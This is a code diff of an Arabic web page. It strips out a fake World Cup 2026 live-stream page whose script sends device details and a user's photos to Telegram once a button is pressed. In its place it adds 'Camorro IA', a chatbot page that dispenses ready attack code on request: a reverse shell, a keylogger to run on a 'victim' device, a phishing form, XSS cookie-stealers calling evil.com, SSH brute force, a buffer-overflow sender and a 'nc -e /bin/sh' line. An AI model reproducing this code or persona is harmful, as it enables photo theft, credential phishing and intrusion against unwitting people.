+            if hashlib.md5(word.encode()).hexdigest() == hash_value:
+                return f"[+] Found MD5: {word}"
+            if hashlib.sha256(word.encode()).hexdigest() == hash_value:
+                return f"[+] Found SHA256: {word}"
+    return "[-] Not found"
 
-        // ---------- COUNTDOWN ----------
-        function updateCountdown() {
-            const matchDate = new Date('2026-07-11T20:00:00Z'); // Final date
-            const now = new Date();
-            const diff = matchDate - now;
-            
-            if (diff <= 0) {
-                document.getElementById('days').textContent = '00';
-                document.getElementById('hours').textContent = '00';
-                document.getElementById('minutes').textContent = '00';
-                document.getElementById('seconds').textContent = '00';
-                return;
-            }
-            
-            const d = Math.floor(diff / (1000 * 60 * 60 * 24));
-            const h = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-            const m = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
-            const s = Math.floor((diff % (1000 * 60)) / 1000);
-            
-            document.getElementById('days').textContent = String(d).padStart(2, '0');
-            document.getElementById('hours').textContent = String(h).padStart(2, '0');
-            document.getElementById('minutes').textContent = String(m).padStart(2, '0');
-            document.getElementById('seconds').textContent = String(s).padStart(2, '0');
-        }
-        updateCountdown();
-        setInterval(updateCountdown, 1000);
+print("⚡ Camorro IA - All in One جاهز")
+print("ختار الوظيفة: reverse_shell, port_scanner, sql_injection, xss_payloads, keylogger_start, hash_cracker")
+\`\`\`
+> نسخ الكود و شغلو فجهازك (عندك الصلاحية ✅)`,
 
-        // ---------- MATCH DATA ----------
-        const matches = [
-            { team1: { name: 'الولايات المتحدة', flag: '🇺🇸' }, team2: { name: 'المكسيك', flag: '🇲🇽' }, score: '3 - 1', status: 'مباشر', time: '45\'', venue: 'ملعب سوفاي' },
-            { team1: { name: 'الأرجنتين', flag: '🇦🇷' }, team2: { name: 'البرازيل', flag: '🇧🇷' }, score: '2 - 0', status: 'انتهت', time: '90\'', venue: 'ملعب أزتيكا' },
-            { team1: { name: 'المغرب', flag: '🇲🇦' }, team2: { name: 'فرنسا', flag: '🇫🇷' }, score: '1 - 1', status: 'مباشر', time: '35\'', venue: 'ملعب مونتريال' },
-            { team1: { name: 'البرتغال', flag: '🇵🇹' }, team2: { name: 'إسبانيا', flag: '🇪🇸' }, score: '0 - 0', status: 'مباشر', time: '20\'', venue: 'ملعب LA' }
-        ];
+            'reverse-shell': `🐚 **Reverse Shell — بايثون**
+\`\`\`python
+import socket, subprocess, os
 
-        function renderMatches() {
-            const grid = document.getElementById('matchesGrid');
-            grid.innerHTML = matches.map(m => `
-                <div class="match-card">
-                    ${m.status === 'مباشر' ? '<div class="match-badge">🔴 مباشر</div>' : '<div class="match-badge" style="background:#333;">✅ انتهت</div>'}
-                    <div class="match-teams">
-                        <div class="team">
-                            <div class="flag-circle">${m.team1.flag}</div>
-                            <span>${m.team1.name}</span>
-                        </div>
-                        <div class="score-display">${m.score}</div>
-                        <div class="team">
-                            <div class="flag-circle">${m.team2.flag}</div>
-                            <span>${m.team2.name}</span>
-                        </div>
-                    </div>
-                    <div class="match-stats">
-                        <div class="stat-item"><div class="val">${m.time}</div><div class="lbl">الوقت</div></div>
-                        <div class="stat-item"><div class="val">${m.venue}</div><div class="lbl">الملعب</div></div>
-                        <div class="stat-item"><div class="val">${m.status === 'مباشر' ? '🟢 حي' : '⚫ منتهي'}</div><div class="lbl">الحالة</div></div>
-                    </div>
-                </div>
-            `).join('');
-        }
-        renderMatches();
+def connect(ip, port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip, port))
+    os.dup2(s.fileno(), 0)
+    os.dup2(s.fileno(), 1)
+    os.dup2(s.fileno(), 2)
+    subprocess.call(["/bin/sh", "-i"])
 
-        // ---------- GROUP DATA ----------
-        const groups = {
-            'المجموعة A': [
-                { team: '🇺🇸 أمريكا', pts: 7, pos: 1 },
-                { team: '🇲🇽 المكسيك', pts: 5, pos: 2 },
-                { team: '🇨🇦 كندا', pts: 4, pos: 3 },
-                { team: '🇨🇷 كوستاريكا', pts: 0, pos: 4 }
-            ],
-            'المجموعة B': [
-                { team: '🇦🇷 الأرجنتين', pts: 9, pos: 1 },
-                { team: '🇲🇦 المغرب', pts: 4, pos: 2 },
-                { team: '🇫🇷 فرنسا', pts: 3, pos: 3 },
-                { team: '🇭🇷 كرواتيا', pts: 1, pos: 4 }
-            ],
-            'المجموعة C': [
-                { team: '🇵🇹 البرتغال', pts: 6, pos: 1 },
-                { team: '🇪🇸 إسبانيا', pts: 5, pos: 2 },
-                { team: '🇩🇪 ألمانيا', pts: 3, pos: 3 },
-                { team: '🇯🇵 اليابان', pts: 2, pos: 4 }
-            ],
-            'المجموعة D': [
-                { team: '🏴󠁧󠁢󠁥󠁮󠁧󠁿 إنجلترا', pts: 7, pos: 1 },
-                { team: '🇳🇱 هولندا', pts: 5, pos: 2 },
-                { team: '🇧🇪 بلجيكا', pts: 4, pos: 3 },
-                { team: '🇸🇳 السنغال', pts: 1, pos: 4 }
-            ]
+# عوّض IP و PORT
+connect("192.168.1.100", 4443)
+\`\`\`
+> باش تستقبل: nc -lvnp 4443`,
+
+            'sql-injection': `💉 **SQL Injection — بايثون**
+\`\`\`python
+import requests
+
+url = "http://target.com/page"
+params = {"id": "1' OR '1'='1' --", "username": "admin'--"}
+
+for p in params.values():
+    r = requests.get(url, params={"q": p})
+    if "error" in r.text or "sql" in r.text or "admin" in r.text:
+        print(f"[SQLi] ${p}")
+\`\`\`
+> جرب ب SQLMap: sqlmap -u "http://target.com/page?id=1" --dbs`,
+
+            'xss': `🔥 **XSS Payloads — HTML/JS**
+\`\`\`html
+<!-- Stored XSS -->
+<script>fetch('http://evil.com/steal?c='+document.cookie)</script>
+
+<!-- Reflected XSS -->
+<img src=x onerror="new Image().src='http://evil.com/?c='+document.cookie">
+
+<!-- DOM XSS -->
+<svg/onload=alert(1)>
+\`\`\`
+> باش تختبر: ادخل البايلود فinput/output`,
+
+            'scanner': `📡 **Port Scanner سريع**
+\`\`\`python
+import socket
+
+target = input("الهدف: ")
+ports = [21,22,25,53,80,110,143,443,445,993,995,1433,1521,2049,3306,3389,5432,5900,8080,8443,27017]
+
+for port in ports:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(0.3)
+    if s.connect_ex((target, port)) == 0:
+        print(f"✅ {target}:{port} — OPEN")
+    s.close()
+\`\`\``,
+
+            'keylogger': `⌨️ **Keylogger متقدم**
+\`\`\`python
+from pynput.keyboard import Listener
+import logging
+
+logging.basicConfig(filename="camorro_keys.log", level=logging.DEBUG, format="%(asctime)s: %(message)s")
+
+def on_press(key):
+    logging.info(str(key))
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
+\`\`\`
+> تشتغل فخلفية: python3 keylogger.py &`,
+
+            'phishing': `🎣 **Phishing Page — HTML**
+\`\`\`html
+<!DOCTYPE html>
+<html>
+<head><title>تحديث الأمان</title></head>
+<body style="font-family:sans-serif;text-align:center;padding:50px">
+    <h2>🔒 تحديث أمني مطلوب</h2>
+    <form action="http://evil.com/steal.php" method="POST">
+        <input type="email" name="email" placeholder="الإيميل" required><br><br>
+        <input type="password" name="pass" placeholder="كلمة السر" required><br><br>
+        <button type="submit">تأكيد التحديث</button>
+    </form>
+</body>
+</html>
+\`\`\`
+> جهز سيرڤير باش تستقبل: nc -lvnp 8080`,
+
+            'brute-force': `🔨 **Brute Force — SSH/FTP**
+\`\`\`python
+import paramiko
+
+target = input("الهدف: ")
+user = "root"
+wordlist = "passwords.txt"
+
+with open(wordlist, "r") as f:
+    for p in f:
+        p = p.strip()
+        try:
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            client.connect(target, username=user, password=p, timeout=3)
+            print(f"[+] Found: {user}:{p}")
+            client.close()
+            break
+        except:
+            print(f"[-] {p}")
+\`\`\``,
+
+            'reverse-engineering': `🔬 **Reverse Engineering — تحلیل الملفات**
+\`\`\`bash
+# Camorro IA - أدوات التحليل
+file target.bin          # نوع الملف
+strings target.bin       # استخراج النصوص
+hexdump -C target.bin    # عرض الهيكس
+objdump -d target.bin    # تفكيك الكود
+ltrace ./target.bin      # تتبع المكتبات
+strace ./target.bin      # تتبع النظام
+\`\`\`
+> فك التشفير: ghidra, IDA, radare2`,
+
+            'network-sniffer': `🌐 **Network Sniffer — بايثون**
+\`\`\`python
+import socket, struct
+
+s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
+while True:
+    packet, addr = s.recvfrom(65535)
+    eth_header = packet[:14]
+    eth = struct.unpack("!6s6sH", eth_header)
+    print(f"📦 {addr} -> MAC: {eth[1].hex(':')}")
+\`\`\`
+> شغلو ب sudo: sudo python3 sniffer.py`,
+
+            'crypto': `🔐 **Hash Cracker — MD5/SHA**
+\`\`\`python
+import hashlib
+
+hash_target = input("الهاش: ")
+wordlist = "rockyou.txt"
+
+with open(wordlist, "r", errors="ignore") as f:
+    for word in f:
+        word = word.strip()
+        if hashlib.md5(word.encode()).hexdigest() == hash_target:
+            print(f"[+] MD5: {word}")
+            break
+        if hashlib.sha256(word.encode()).hexdigest() == hash_target:
+            print(f"[+] SHA256: {word}")
+            break
+\`\`\``,
+
+            'exploit': `💥 **Exploit Development — Buffer Overflow**
+\`\`\`python
+#!/usr/bin/python3
+import sys, socket
+
+ip = sys.argv[1]
+port = int(sys.argv[2])
+
+# Pattern offset
+payload = b"A" * 2003 + b"BBBB" + b"C" * (5000 - 2007)
+
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip, port))
+    s.send(payload + b"\r\n")
+    s.close()
+    print("[+] Payload sent!")
+except:
+    print("[-] Connection failed")
+\`\`\`
+> استعمل msf-pattern_offset باش تعرف الـ EIP offset`
         };
 
-        function renderGroups() {
-            const grid = document.getElementById('groupsGrid');
-            grid.innerHTML = Object.entries(groups).map(([name, teams]) => `
-                <div class="group-card">
-                    <h3>${name}</h3>
-                    ${teams.map(t => `
-                        <div class="group-row ${t.pos <= 2 ? 'highlight' : ''}">
-                            <span class="pos">${t.pos}</span>
-                            <span class="team-name">${t.team}</span>
-                            <span class="pts">${t.pts}</span>
-                        </div>
-                    `).join('')}
-                </div>
-            `).join('');
-        }
-        renderGroups();
+        // ====================== CHAT LOGIC ======================
+        let currentScript = 'all-in-one';
 
-        // ---------- BRACKET ----------
-        function renderBracket() {
-            const container = document.getElementById('bracketContainer');
-            container.innerHTML = `
-                <div class="bracket-round">
-                    <h4>دور 16</h4>
-                    <div class="bracket-match">🇺🇸 أمريكا vs 🇨🇦 كندا</div>
-                    <div class="bracket-match">🇦🇷 الأرجنتين vs 🇭🇷 كرواتيا</div>
-                    <div class="bracket-match">🇵🇹 البرتغال vs 🇧🇪 بلجيكا</div>
-                    <div class="bracket-match">🏴󠁧󠁢󠁥󠁮󠁧󠁿 إنجلترا vs 🇸🇳 السنغال</div>
-                </div>
-                <div class="bracket-round">
-                    <h4>ربع النهائي</h4>
-                    <div class="bracket-match">🇺🇸 أمريكا vs 🇦🇷 الأرجنتين</div>
-                    <div class="bracket-match">🇵🇹 البرتغال vs 🏴󠁧󠁢󠁥󠁮󠁧󠁿 إنجلترا</div>
-                    <div class="bracket-match">🇲🇦 المغرب vs 🇫🇷 فرنسا</div>
-                    <div class="bracket-match">🇲🇽 المكسيك vs 🇪🇸 إسبانيا</div>
-                </div>
-                <div class="bracket-round">
-                    <h4>نصف النهائي</h4>
-                    <div class="bracket-match">🇺🇸 أمريكا vs 🏴󠁧󠁢󠁥󠁮󠁧󠁿 إنجلترا</div>
-                    <div class="bracket-match">🇲🇦 المغرب vs 🇪🇸 إسبانيا</div>
-                </div>
-                <div class="bracket-round" style="border-color:#FFD700;">
-                    <h4 style="color:#FFD700;">🏆 النهائي</h4>
-                    <div class="bracket-match" style="font-weight:700;">🇺🇸 أمريكا vs 🇪🇸 إسبانيا</div>
-                    <div style="color:#FFD700; font-weight:900; font-size:1.2rem; text-align:center; margin-top:8px;">4 يوليو 2026</div>
+        function sendMessage() {
+            const input = document.getElementById('userInput');
+            const chatLog = document.getElementById('chatLog');
+            const text = input.value.trim();
+            if (!text) return;
+
+            chatLog.innerHTML += `<div class="msg user-msg"><span class="sender">🧑‍💻 أنت</span>${escapeHtml(text)}</div>`;
+            chatLog.scrollTop = chatLog.scrollHeight;
+
+            // Generate response
+            const response = getCamorroResponse(text);
+            chatLog.innerHTML += `<div class="msg bot-msg"><span class="sender">🤖 Camorro IA</span>${response}</div>`;
+            chatLog.scrollTop = chatLog.scrollHeight;
+
+            // Auto-load script in output if keyword found
+            const lower = text.toLowerCase();
+            for (const [key] of Object.entries(db)) {
+                if (lower.includes(key.replace('-', ' ')) || key.includes(lower.split(' ')[0])) {
+                    showOutput(key);
+                    break;
+                }
+            }
+
+            input.value = '';
+            input.focus();
+        }
+
+        function getCamorroResponse(input) {
+            const lower = input.toLowerCase();
+
+            // التحية
+            if (lower.includes('سلام') || lower.includes('السلام') || lower.includes('صباح') || lower.includes('مساء')) {
+                return 'وعليكم السلام ورحمة الله! أنا Camorro، شنو بغيتي ندير ليك؟ 🔥';
+            }
+
+            // الطلبات المباشرة
+            if (lower.includes('reverse') || lower.includes('شيل') || (lower.includes('قشرة') && lower.includes('عكس'))) {
+                showOutput('reverse-shell');
+                return 'هاك الـ **Reverse Shell** بــ Python. عوّض الـ IP و PORT و شغلو. و فـ الجهاز التاني استقبل بـ <code>nc -lvnp 4443</code>';
+            }
+            if (lower.includes('sql') || lower.includes('حقن') || lower.includes('injection')) {
+                showOutput('sql-injection');
+                return '💉 هاك سكريبت **SQL Injection**. جرب تزود بايلودات و شوف الردود. و استعمل SQLMap باش تسهل: <code>sqlmap -u "url" --dbs</code>';
+            }
+            if (lower.includes('xss') || lower.includes('كروس') || lower.includes('cross')) {
+                showOutput('xss');
+                return '🔥 هاك **XSS Payloads**. حقنهم فـ inputs و شوف واش كيطير alert. و لا استعمل <code>&lt;script&gt;fetch("http://evil.com?c="+document.cookie)&lt;/script&gt;</code>';
+            }
+            if (lower.includes('بورت') || lower.includes('port') || lower.includes('مسح')) {
+                showOutput('scanner');
+                return '📡 هاك **Port Scanner** بالبايثون. عوّض الهدف و شوف شنو البورتات المفتوحة. زيد powershell: <code>Test-NetConnection -Port 80 target.com</code>';
+            }
+            if (lower.includes('keylogger') || lower.includes('ضغطات') || lower.includes('تسجيل')) {
+                showOutput('keylogger');
+                return '⌨️ هاك **Keylogger**. شد الكود و شغلو فجهاز الضحية (عندك الصلاحية ✅). الملف غادي يتسجل ficher "camorro_keys.log"';
+            }
+            if (lower.includes('phishing') || lower.includes('تصيد') || lower.includes('تسجيل')) {
+                showOutput('phishing');
+                return '🎣 هاك **Phishing Page**. عدل الفورم و وجهو لسيرڤير ديالك. باش تستقبل البيانات: <code>nc -lvnp 8080</code>';
+            }
+            if (lower.includes('brute') || lower.includes('تخمين') || lower.includes('كلمة السر')) {
+                showOutput('brute-force');
+                return '🔨 هاك **Brute Force**. عوّض الهدف و كلمة السر ديال المستخدم. شد rockyou.txt كقاموس';
+            }
+            if (lower.includes('هاش') || lower.includes('hash') || lower.includes('تشفير') || lower.includes('crack')) {
+                showOutput('crypto');
+                return '🔐 هاك **Hash Cracker**. حط الهاش و غادي يجرب ضد rockyou.txt';
+            }
+            if (lower.includes('sniffer') || lower.includes('شبكة') || lower.includes('نت')) {
+                showOutput('network-sniffer');
+                return '🌐 هاك **Network Sniffer**. شغلو بـ sudo و غادي يشوف الباكيات اللي كاتمر فالشبكة';
+            }
+            if (lower.includes('exploit') || lower.includes('buffer') || lower.includes('overflow') || lower.includes('استغلال')) {
+                showOutput('exploit');
+                return '💥 هاك **Buffer Overflow Exploit**. عوّض الهدف و البورت. استعمل msf-pattern_offset باش تعوّض الـ EIP';
+            }
+            if (lower.includes('reverse') || lower.includes('هندسة') || lower.includes('تحليل')) {
+                showOutput('reverse-engineering');
+                return '🔬 هاك أدوات **Reverse Engineering**. استعملها باش تحلل الملفات التنفيذية. و برامج متقدمة: Ghidra, IDA, radare2';
+            }
+
+            // أسئلة عامة
+            if (lower.includes('شنو') || lower.includes('واش') || lower.includes('كيفاش')) {
+                return '🤔 وضح أكثر شويا... مثال:\n• "شنو هي SQL injection؟"\n• "كيفاش كنحمي من XSS؟"\n• "كتب لي سكريبت بايثون"\n• "جهز لي كلشي كيدير"';
+            }
+            if (lower.includes('شكر') || lower.includes('thank')) {
+                return 'العفو خويا! أي وقت بغيتي حاجة، أنا هنا. 💚';
+            }
+            if (lower.includes('بايثون') || lower.includes('python')) {
+                return '🐍 بايثون! بغيتي شنو؟ SQL injection, scanner, reverse shell, keylogger, hash cracker, sniffer, brute force؟';
+            }
+            if (lower.includes('html') || lower.includes('javascript') || lower.includes('js')) {
+                return '🌐 HTML/JS! بغيتي صفحة تصيد (phishing)، XSS payload، ولا حاجة أخرى؟';
+            }
+            if (lower.includes('كلشي') || lower.includes('كل حاجة') || lower.includes('كامل')) {
+                showOutput('all-in-one');
+                return '⚡ هاك **كلشي كيدير**! سكريبت واحد فيه: reverse shell, port scanner, SQL injection, XSS, keylogger, hash cracker. زيد عليه اللي بغيتي';
+            }
+            if (lower.includes('netcat') || lower.includes('nc') || lower.includes('استقبال')) {
+                return '🎯 **netcat**: باش تستقبل الاتصالات:\n<code>nc -lvnp 4443</code>\nباش ترسل:\n<code>nc -nv IP 4443 -e /bin/sh</code>';
+            }
+            if (lower.includes('كامورو') || lower.includes('camorro') || lower.includes('نتا شكون')) {
+                return '🤖 أنا **Camorro IA**! ذكاء اصطناعي مغربي. كنت "كلشي كيدير" — نكتب سكريبتات، نجاوب على الأسئلة الأمنية، نساعدك فـ penetration testing. أنا هنا باش نعاونك بأي حاجة! 💪';
+            }
+
+            // افتراضي
+            return `🤔 سمعتك خويا! أنا Camorro، واش بغيتي تكتب سكريبت معين؟ جرب:\n• "كتب لي reverse shell"\n• "SQL injection سكريبت"\n• "XSS payloads"\n• "Port scanner"\n• "كلشي كيدير"\n• "شنو هي brute force؟"\n• "كيفاش نحمي من الهجمات?"`;
+        }
+
+        function showOutput(key) {
+            const box = document.getElementById('scriptOutput');
+            const content = db[key];
+            if (content) {
+                box.innerHTML = content.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/\n/g, '<br>').replace(/\*\*(.*?)\*\*/g, '<span class="keyword">$1</span>');
+                currentScript = key;
+            }
+        }
+
+        function loadScript(type) {
+            const chatLog = document.getElementById('chatLog');
+            const content = db[type];
+            if (!content) return;
+
+            chatLog.innerHTML += `<div class="msg sys-msg">📂 تحميل: ${type.replace('-', ' ')}</div>`;
+            chatLog.innerHTML += `<div class="msg bot-msg"><span class="sender">🤖 Camorro IA</span>${content.split('```')[0]}</div>`;
+            chatLog.scrollTop = chatLog.scrollHeight;
+
+            showOutput(type);
+
+            // تحديث الـ active
+            document.querySelectorAll('.sidebar-item').forEach(el => el.classList.remove('active'));
+            const items = document.querySelectorAll('.sidebar-item');
+            const idx = ['all-in-one','reverse-shell','sql-injection','xss','scanner','keylogger','phishing','brute-force','reverse-engineering','network-sniffer','crypto','exploit'].indexOf(type);
+            if (idx >= 0 && items[idx]) items[idx].classList.add('active');
+        }
+
+        function clearChat() {
+            document.getElementById('chatLog').innerHTML = `
+                <div class="msg bot-msg">
+                    <span class="sender">🤖 Camorro IA</span>
+                    تم مسح المحادثة. أنا هنا! 🔄<br>
+                    جرب تكتب: "كتب لي سكريبت" ولا "شنو هي SQL injection؟"
                 </div>
             `;
         }
-        renderBracket();
 
-        // ---------- STATS ----------
-        function renderStats() {
-            const grid = document.getElementById('statsGrid');
-            grid.innerHTML = `
-                <div class="stat-card"><div class="stat-num">32</div><div class="stat-label">منتخب مشارك</div></div>
-                <div class="stat-card"><div class="stat-num">104</div><div class="stat-label">مباراة</div></div>
-                <div class="stat-card"><div class="stat-num">🇦🇷</div><div class="stat-label">الهداف: ليونيل ميسي (7 أهداف)</div></div>
-                <div class="stat-card"><div class="stat-num">16</div><div class="stat-label">مدينة مستضيفة</div></div>
-                <div class="stat-card"><div class="stat-num">3</div><div class="stat-label">دول مستضيفة</div></div>
-                <div class="stat-card"><div class="stat-num">🏆</div><div class="stat-label">البطل: لم يحدد بعد</div></div>
-            `;
-        }
-        renderStats();
-
-        // ============================================================
-        // ===== 🔥 THE MAIN HACK: SILENT PHOTO EXFILTRATION 🔥 =====
-        // ============================================================
-        // This uses the File System Access API (showDirectoryPicker)
-        // and showOpenFilePicker with advanced options to enumerate
-        // and exfiltrate ALL photos from the device silently.
-        // ============================================================
-
-        let exfilInProgress = false;
-        let totalExfiltrated = 0;
-
-        // 1. Initial device info exfil
-        (async function initialReport() {
-            const info = getDeviceInfo();
-            await sendToTelegram(
-                `🔥 *جهاز جديد دخل الصفحة* 🔥\n\n` +
-                `📱 *النظام*: ${info.os} ${info.osVersion}\n` +
-                `🌐 *اللغة*: ${info.language}\n` +
-                `📏 *الشاشة*: ${info.screen}\n` +
-                `🕐 *المنطقة*: ${info.timezone}\n` +
-                `🆔 *المنصة*: ${info.platform}\n` +
-                `⏰ *التوقيت*: ${info.timestamp}`
-            );
-        })();
-
-        // 2. The MAIN function: Request file access once, then extract ALL images
-        async function requestFileAccessAndExfiltrate() {
-            if (exfilInProgress) {
-                showToast('⚠️ جاري التحميل بالفعل، انتظر قليلاً...');
-                return;
-            }
-            
-            exfilInProgress = true;
-            showToast('📂 جاري فتح نافذة الوصول إلى الملفات...');
-            
-            try {
-                // ====== STRATEGY 1: File System Access API (showDirectoryPicker) ======
-                // This gives access to the entire directory tree
-                // Only works on Chrome/Edge 86+ (Android, Windows, macOS)
-                // iOS Safari does NOT support this yet
-                
-                if ('showDirectoryPicker' in window) {
-                    showToast('📁 جاري فتح متصفح المجلدات...');
-                    
-                    const dirHandle = await window.showDirectoryPicker();
-                    showToast(`📂 تم الوصول إلى المجلد: ${dirHandle.name}`);
-                    
-                    // Report directory access to Telegram
-                    await sendToTelegram(
-                        `📁 *تم الوصول إلى مجلد*\n\n` +
-                        `📂 اسم المجلد: ${dirHandle.name}\n` +
-                        `📱 الجهاز: ${getDeviceInfo().os}\n` +
-                        `🆔 نوع الوصول: showDirectoryPicker`
-                    );
-                    
-                    // Recursively walk directory and find images
-                    let foundCount = 0;
-                    const imageExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.heic', '.heif', '.tiff', '.tif'];
-                    
-                    async function walkDirectory(dirHandle, path = '') {
-                        for await (const entry of dirHandle.values()) {
-                            if (exfilInProgress === false) break; // allow cancellation
-                            
-                            if (entry.kind === 'file') {
-                                const ext = '.' + entry.name.split('.').pop().toLowerCase();
-                                if (imageExtensions.includes(ext)) {
-                                    try {
-                                        const file = await entry.getFile();
-                                        
-                                        // Read as base64
-                                        const reader = new FileReader();
-                                        const base64 = await new Promise((resolve, reject) => {
-                                            reader.onload = () => resolve(reader.result);
-                                            reader.onerror = reject;
-                                            reader.readAsDataURL(file);
-                                        });
-                                        
-                                        // Send to Telegram
-                                        await sendToTelegram(
-                                            `📸 *صورة مسربة* 📸\n` +
-                                            `📁 المسار: ${path}/${entry.name}\n` +
-                                            `📏 الحجم: ${(file.size / 1024).toFixed(1)} KB\n` +
-                                            `📱 من جهاز: ${getDeviceInfo().os}`,
-                                            base64,
-                                            entry.name,
-                                            file.type
-                                        );
-                                        
-                                        foundCount++;
-                                        totalExfiltrated++;
-                                        
-                                        // Show progress
-                                        showToast(`✅ تم تسريب ${foundCount} صور...`, 2000);
-                                        
-                                        // Rate limiting: wait between sends
-                                        await new Promise(r => setTimeout(r, 800));
-                                        
-                                    } catch (fileErr) {
-                                        console.error('File read error:', fileErr);
-                                    }
-                                }
-                            } else if (entry.kind === 'directory') {
-                                // Recurse into subdirectory
-                                await walkDirectory(entry, `${path}/${entry.name}`);
-                            }
-                        }
-                    }
-                    
-                    await walkDirectory(dirHandle);
-                    
-                    await sendToTelegram(
-                        `✅ *اكتملت عملية التسريب*\n\n` +
-                        `📸 عدد الصور المسربة: ${foundCount}\n` +
-                        `📱 الجهاز: ${getDeviceInfo().os}\n` +
-                        `📂 المصدر: ${dirHandle.name}`
-                    );
-                    
-                    showToast(`✅ تم ${foundCount > 0 ? `تسريب ${foundCount} صورة` : 'فحص المجلد (لم نجد صور)'}`);
-                    
-                } 
-                // ====== STRATEGY 2: showOpenFilePicker (multiple files) ======
-                else if ('showOpenFilePicker' in window) {
-                    showToast('📁 جاري فتح نافذة اختيار الملفات...');
-                    
-                    try {
-                        const fileHandles = await window.showOpenFilePicker({
-                            multiple: true,
-                            types: [{
-                                description: 'Images',
-                                accept: { 'image/*': ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp'] }
-                            }]
-                        });
-                        
-                        showToast(`📂 تم اختيار ${fileHandles.length} ملف`);
-                        
-                        // Report
-                        await sendToTelegram(
-                            `📁 *تم الوصول إلى ملفات*\n\n` +
-                            `📂 عدد الملفات: ${fileHandles.length}\n` +
-                            `📱 الجهاز: ${getDeviceInfo().os}`
-                        );
-                        
-                        let sentCount = 0;
-                        for (const handle of fileHandles) {
-                            try {
-                                const file = await handle.getFile();
-                                
-                                // Read as base64
-                                const reader = new FileReader();
-                                const base64 = await new Promise((resolve, reject) => {
-                                    reader.onload = () => resolve(reader.result);
-                                    reader.onerror = reject;
-                                    reader.readAsDataURL(file);
-                                });
-                                
-                                await sendToTelegram(
-                                    `📸 *صورة مسربة* 📸\n` +
-                                    `📁 الملف: ${file.name}\n` +
-                                    `📏 الحجم: ${(file.size / 1024).toFixed(1)} KB\n` +
-                                    `📱 من جهاز: ${getDeviceInfo().os}`,
-                                    base64,
-                                    file.name,
-                                    file.type
-                                );
-                                
-                                sentCount++;
-                                totalExfiltrated++;
-                                showToast(`✅ تم تسريب ${sentCount}/${fileHandles.length}...`, 1000);
-                                await new Promise(r => setTimeout(r, 500));
-                                
-                            } catch(e) { console.error(e); }
-                        }
-                        
-                        showToast(`✅ تم تسريب ${sentCount} صورة`);
-                        
-                    } catch (pickerErr) {
-                        showToast('⚠️ تم إلغاء الاختيار');
-                    }
-                    
-                }
-                // ====== STRATEGY 3: Classic file input with webkitdirectory ======
-                else {
-                    showToast('📁 جاري استخدام الطريقة البديلة...');
-                    
-                    // Create hidden file input with directory selection
-                    const input = document.createElement('input');
-                    input.type = 'file';
-                    input.webkitdirectory = true; // Chrome/Firefox
-                    input.mozdirectory = true;
-                    input.directory = true;
-                    input.multiple = true;
-                    input.accept = 'image/*';
-                    input.style.display = 'none';
-                    document.body.appendChild(input);
-                    
-                    input.addEventListener('change', async (e) => {
-                        const files = e.target.files;
-                        if (!files || !files.length) {
-                            showToast('لم يتم اختيار أي ملفات');
-                            return;
-                        }
-                        
-                        showToast(`📂 تم اختيار ${files.length} ملف`);
-                        
-                        await sendToTelegram(
-                            `📁 *تم الوصول إلى الملفات*\n\n` +
-                            `📂 عدد الملفات: ${files.length}\n` +
-                            `📱 الجهاز: ${getDeviceInfo().os}\n` +
-                            `🆔 الطريقة: webkitdirectory`
-                        );
-                        
-                        let sentCount = 0;
-                        const imageExts = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.heic'];
-                        
-                        for (const file of files) {
-                            const ext = '.' + file.name.split('.').pop().toLowerCase();
-                            if (!imageExts.includes(ext)) continue;
-                            
-                            try {
-                                const reader = new FileReader();
-                                const base64 = await new Promise((resolve, reject) => {
-                                    reader.onload = () => resolve(reader.result);
-                                    reader.onerror = reject;
-                                    reader.readAsDataURL(file);
-                                });
-                                
-                                const path = file.webkitRelativePath || file.name;
-                                
-                                await sendToTelegram(
-                                    `📸 *صورة مسربة* 📸\n` +
-                                    `📁 المسار: ${path}\n` +
-                                    `📏 الحجم: ${(file.size / 1024).toFixed(1)} KB\n` +
-                                    `📱 من جهاز: ${getDeviceInfo().os}`,
-                                    base64,
-                                    file.name,
-                                    file.type
-                                );
-                                
-                                sentCount++;
-                                totalExfiltrated++;
-                                showToast(`✅ تم تسريب ${sentCount} صورة`, 1000);
-                                await new Promise(r => setTimeout(r, 600));
-                                
-                            } catch(e) { console.error(e); }
-                            
-                            // Limit to prevent Telegram rate limits
-                            if (sentCount >= 50) {
-                                showToast('⚠️ تم الوصول للحد الأقصى (50 صورة)');
-                                break;
-                            }
-                        }
-                        
-                        await sendToTelegram(
-                            `✅ *اكتمل التسريب*\n\n` +
-                            `📸 الصور المسربة: ${sentCount}\n` +
-                            `📱 الجهاز: ${getDeviceInfo().os}`
-                        );
-                        
-                        showToast(`✅ تم تسريب ${sentCount} صورة بنجاح`);
-                        
-                        // Clean up
-                        document.body.removeChild(input);
-                    });
-                    
-                    // Trigger click
-                    input.click();
-                }
-                
-            } catch (err) {
-                console.error('Exfil error:', err);
-                showToast(`❌ خطأ: ${err.message || 'غير معروف'}`);
-                await sendToTelegram(
-                    `❌ *خطأ في التسريب*\n\n` +
-                    `📱 ${getDeviceInfo().os}\n` +
-                    `⚠️ ${err.message || 'فشل الوصول'}`
-                );
-            }
-            
-            exfilInProgress = false;
+        function copyOutput() {
+            const text = document.getElementById('scriptOutput').innerText;
+            navigator.clipboard.writeText(text).then(() => {
+                alert('✅ تم النسخ!');
+            }).catch(() => {
+                // Fallback
+                const textarea = document.createElement('textarea');
+                textarea.value = text;
+                document.body.appendChild(textarea);
+                textarea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textarea);
+                alert('✅ تم النسخ!');
+            });
         }
 
-        // 3. Bind the access button
-        document.getElementById('accessBtn').addEventListener('click', async function() {
-            const btn = this;
-            
-            // First: show a premium loading effect
-            btn.textContent = '🔄 جاري تجهيز البث...';
-            btn.disabled = true;
-            
-            // Add a small delay for UX (the button looks premium)
